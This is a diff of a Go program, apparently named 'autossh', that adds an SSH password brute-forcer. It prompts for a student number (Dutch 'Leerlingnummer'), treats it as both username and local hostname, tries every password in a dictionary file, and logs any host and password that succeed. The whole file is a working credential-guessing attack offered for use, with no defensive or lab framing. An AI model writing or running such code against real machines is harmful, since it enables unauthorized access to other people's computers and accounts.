@@ -2,15 +2,50 @@ package main
 
 import (
 	"fmt"
+	"log"
 	"os"
+
+	"github.com/cfschilham/autossh/internal/loadcfg"
+	"github.com/cfschilham/autossh/internal/sshconn"
 )
 
-func loadDictTxt(path string) error {
-	dict, _ := os.Open(path)
-	fmt.Println(dict)
-	return nil
-}
-
 func main() {
-	loadDictTxt("../cfg/dict.txt")
+	config, err := loadcfg.LoadConfig()
+	if err != nil {
+		log.Fatalln(err)
+	}
+	dict, err := loadcfg.LoadDict(config.DictPath())
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	if config.Mode() == "manual" {
+		var hostname string
+
+		for {
+			fmt.Print("Leerlingnummer (type 'exit' to exit): ")
+			fmt.Scanln(&hostname)
+			if hostname == "exit" {
+				os.Exit(0)
+			}
+
+			for _, entry := range dict.Pwds() {
+				log.Printf("Attempting to establish SSH connection at '%s' using password '%s'\n", hostname+"@"+hostname+".local:22", entry)
+				if err := sshconn.SSHConn(hostname+".local:22", hostname, entry, ""); err != nil {
+					if config.Verbose() {
+						log.Println(err)
+					}
+					log.Printf("Failed to connect\n")
+				} else {
+					log.Printf("Connection successfully established!\n")
+					log.Printf("Host: %s\nPass: %s\n", hostname+"@"+hostname+".local", entry)
+				}
+			}
+		}
+
+	} else if config.Mode() == "json" {
+		log.Fatalln("Whoops, JSON mode is not supported yet!")
+	} else {
+		log.Fatalf("Whoops, '%s' is not a valid mode, you fool!\n", config.Mode())
+	}
 }
